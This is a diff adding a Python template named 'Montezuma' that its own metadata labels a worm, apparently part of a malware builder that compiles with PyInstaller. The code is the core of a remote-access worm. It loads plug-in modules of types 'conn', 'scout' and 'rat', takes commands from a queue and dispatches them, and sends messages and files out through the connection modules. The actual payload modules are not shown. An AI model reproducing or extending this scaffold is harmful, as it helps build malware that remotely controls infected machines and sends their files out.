@@ -1,0 +1,131 @@
+#!name##Montezuma
+#!itemType##worm
+#!info##The worm template written in Python, designed without a specific purpose. It allows integration of any number of additional Python-based modules. Ideal for building custom payloads and flexible worm structures in Python.
+#!lang##python
+#!Wprocess##BasicPy
+#!wormCompiler##PyInstaller
+#!itemTags##LW
+#!typeAccept##PySM##PyExM##PySh
+
+
+from time import sleep
+import queue
+
+
+class Montezuma:
+    def __init__(self):
+        self.name = "{{_WORM_NAME}}"
+        self.__modules = {{pyTOOL.makeModulesDict(_PY_MODULES)}}
+        self._modules = {"conn" : [], "scout" : [], "rat" : []}
+        self._no_type_modules = []
+        self.working = False
+        self.in_cmd = queue.Queue()
+    
+    @property
+    def connMods(self) -> list:
+        return self._modules["conn"]
+    
+    @property
+    def allMods(self) -> list:
+        mods = []
+        for mod_list in self._modules.values():
+            mods.extend(mod_list)
+        mods.extend(self._no_type_modules)
+        return mods
+    
+    @property
+    def is_conn(self) -> bool:
+        return self._is_conn()
+    
+
+    def _is_conn(self) -> bool:
+        for mod in self.connMods:
+            if mod.is_conn:
+                return True
+        return False
+    
+
+    def _load_modules(self) -> None:
+        for mod in self.__modules.values():
+            try:
+                exmod = mod(self)
+            except Exception as e:
+                print("ERROR Init Module: ", e)
+                continue
+            if mod.MTYPES in self._modules.keys():
+                self._modules[mod.MTYPES].append(exmod)
+            else:
+                self._no_type_modules.append(exmod)
+
+    
+    def _run_modules(self) -> None:
+        for mod in self.allMods:
+            print(mod)
+            try:
+                mod.start()
+            except Exception as e:
+                print("ERROR start module: ", e)
+    
+    def send_msg(self, msg: str, *args, **kwargs) -> None:
+        for mod in self.connMods:
+            try:
+                mod.send_msg(msg, *args, **kwargs)
+            except Exception as e:
+                print("ERROR: ", e)
+    
+    def send_file(self, *args, **kwargs) -> None:
+        for mod in self.connMods:
+            try:
+                mod.send_file(*args, **kwargs)
+            except Exception as e:
+                print("ERROR: ", e)
+    
+    def help(self) -> None:
+        h = "\n--------- HELP -----------\n"
+        h += "'worm_close' - Shutdown Worm\n"
+        for mod in self.allMods:
+            try:
+                h += mod.help()
+            except:
+                pass
+        print("HELP:\n", h)
+        self.send_msg(h)
+    
+    def _exec_cmd(self, cmd: str) -> None:
+        mcmd = cmd.split(" ")
+        match mcmd[0]:
+            case "worm_close":
+                self.working = False
+            case "help":
+                self.help()
+            case _:
+                for mod in self.allMods:
+                    try:
+                        mod.exec_cmd(cmd)
+                    except:
+                        pass
+    
+    def exec_cmd(self, cmd: str) -> None:
+        self._exec_cmd(cmd)
+    
+    def test(self):
+        self.send_file(fpath="./bbb.jpg")
+    
+
+    def work(self) -> None:
+        while self.working:
+            cmd = self.in_cmd.get()
+            self.exec_cmd(cmd)
+
+    
+    def Run(self) -> None:
+        self.working = True
+        self._load_modules()
+        self._run_modules()
+        self.work()
+
+
+if __name__ == "__main__":
+    montek = Montezuma()
+    montek.Run()
+    
